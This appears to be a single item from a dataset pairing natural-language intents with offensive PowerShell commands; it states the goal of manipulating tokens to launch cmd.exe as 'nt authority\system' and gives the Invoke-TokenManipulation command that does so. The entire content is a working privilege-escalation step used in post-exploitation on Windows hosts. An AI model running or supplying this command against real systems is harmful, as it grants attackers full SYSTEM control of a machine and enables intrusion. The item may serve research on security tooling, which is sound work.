# Natural language intent:
# Manipulate tokens to create a new process (cmd.exe) with the username 'nt authority\system'.

Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username nt authority\system
